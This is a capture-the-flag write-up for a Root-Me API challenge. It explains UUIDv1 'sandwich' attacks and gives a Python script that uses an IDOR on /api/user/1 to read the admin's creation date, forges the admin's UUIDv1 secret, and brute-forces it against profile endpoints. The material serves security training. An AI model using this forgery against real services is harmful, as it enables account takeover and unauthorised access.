## Walk Through

This challenge involves cracking the admin UUIDv1 ("secret") -> We immediately spot UUIDv1 when creating an account and logging in (the 1st number of the 3rd "packet"). This was the only option because other versions are way more secured (espacially v4) than v1 (time & server MAC addr based).

- The attack flow took me a while (1h30~) to find, even tho i understood the attack principles because i was focused on the sandwich attack.
  When speaking of UUIDv1 cracking, we usually perform a "sandwich attack" to find what the "in-between" UUIDv1 that we are looking for is. 
  This can be achieved by for example sending a password reset request for our known attacker-account1, then sending the same request for the victim-account (the UUID we want to know) to finally send the request with another known attacker-account2.
  Because the generated UUID (time based mainly because the server MAC doesn't change) of the victim is in-between the two accounts that we have access to: we can easily find out what is the UUID of the victim with a little bit of brute-force.

- In our case, only the "login" POST request generates a UUID. Basically, we can't find out what the admin UUID is because we can't perform the attack ;(

- This, is what I would I've said if I was still stuck and didn't observe a little bit more ^^' :
	- In fact, I was focusing on using OPTIONS to see if there was any other methods to get the admin account creation date information, while in reality, the solution was easy to find.
	- We simply had to use the "retrieve limited user information" GET because in the API response, we can see `"creatoin_date":` Let's ask the API if it knows the account creation date for the admin account (`"userid": 1`).
	- After executing the request, we obtain `"creation_date": "2026-10-28 03:10:40.475457"`, from what we can deduce the UUID of the admin.
	- We have to use a script to brute force the first 2 packets. `#!/usr/bin/env python3`
`"""`
`root-me — API - Broken Access 2`
`Forge le "secret" (UUIDv1) de l'admin à partir de sa creation_date,`
`en réutilisant le node + clock_seq constants extraits de notre propre secret.`
`"""`

`import uuid`
`import requests`
`from datetime import datetime, timezone`


`BASE_URL     = "http://challenge01.root-me.org:59091"`
`MY_SECRET    = "73b34ada-d30b-11f1-98e3-0242ac100016"   # notre propre secret (uuid1)`
`USERNAME     = ""   # compte créé via /api/signup`
`PASSWORD     = ""`


`UUID_EPOCH_OFFSET = 0x01B21DD213814000  # offset 100ns entre 1582-10-15 et 1970-01-01`


`def datetime_to_100ns(dt: datetime) -> int:`
    `"""Convertit un datetime naïf (UTC) en ticks UUID (100ns depuis 1582-10-15)."""`
    `unix_us = int(dt.replace(tzinfo=timezone.utc).timestamp() * 1_000_000)`
    `return unix_us * 10 + UUID_EPOCH_OFFSET`


`def forge_uuid(ticks_100ns: int, clock_seq_hi_variant: int, clock_seq_low: int, node: int) -> uuid.UUID:`
    `time_low        = ticks_100ns & 0xFFFFFFFF`
    `time_mid        = (ticks_100ns >> 32) & 0xFFFF`
    `time_hi_version = ((ticks_100ns >> 48) & 0x0FFF) | 0x1000  # version = 1`
    `return uuid.UUID(fields=(time_low, time_mid, time_hi_version,`
                              `clock_seq_hi_variant, clock_seq_low, node))`


`def main():`
    `# 0) Se logger pour obtenir le cookie de session (le serveur utilise "vary: Cookie")`
    `session = requests.Session()`
    `login_resp = session.post(`
        `f"{BASE_URL}/api/login",`
        `json={"username": USERNAME, "password": PASSWORD},`
        `headers={"accept": "application/json"},`
    `)`
    `print(f"[*] login status={login_resp.status_code} cookies={session.cookies.get_dict()}")`
    `print(f"[*] login body: {login_resp.text}")`
    `login_resp.raise_for_status()`

    # 1) Récupérer la date de création de l'admin (IDOR sur /api/user/1)
    r = session.get(f"{BASE_URL}/api/user/1", headers={"accept": "application/json"})
    r.raise_for_status()
    data = r.json()
    creation_date = data["creation_date"]
    print(f"[*] creation_date admin : {creation_date}")

    # 2) Extraire node + clock_seq (constants côté serveur) depuis notre propre secret
    mine = uuid.UUID(MY_SECRET)
    clock_seq_hi_variant = mine.clock_seq_hi_variant
    clock_seq_low        = mine.clock_seq_low
    node                 = mine.node
    print(f"[*] node={node:012x}  clock_seq_hi_variant={clock_seq_hi_variant:02x}  "
          f"clock_seq_low={clock_seq_low:02x}")

    # 3) Reconstruire le timestamp de base, puis bruteforcer le dernier chiffre
    #    (ambiguïté microseconde -> 100ns, 10 valeurs possibles)
    dt = datetime.strptime(creation_date, "%Y-%m-%d %H:%M:%S.%f")
    base_ticks = datetime_to_100ns(dt)

    for offset in range(10):
        candidate = forge_uuid(base_ticks + offset, clock_seq_hi_variant, clock_seq_low, node)
        print(f"[+] essai : {candidate}")

        # ---- ADAPTE CETTE PARTIE À L'ENDPOINT RÉEL QUE TU AS DÉCOUVERT ----
        # Essaie plusieurs variantes si tu n'es pas sûr du format attendu :
        for attempt in [
            lambda s: session.get(f"{BASE_URL}/api/profile", params={"secret": s}),
            lambda s: session.get(f"{BASE_URL}/api/profile/{s}"),
            lambda s: session.post(f"{BASE_URL}/api/profile", json={"secret": s}),
        ]:
            resp = attempt(str(candidate))
            if resp.status_code == 200 and "admin" in resp.text.lower():
                print("\n[FLAG TROUVÉ] secret admin =", candidate)
                print(resp.text)
                return

    print("[-] Aucun candidat n'a fonctionné — vérifie l'endpoint/paramètre exact "
          "(regarde /openapi.json, /swagger.json, ou les endpoints déjà vus dans le "
          "challenge 1 : /api/signup, /api/login, /api/user, /api/note).")

    `main()`
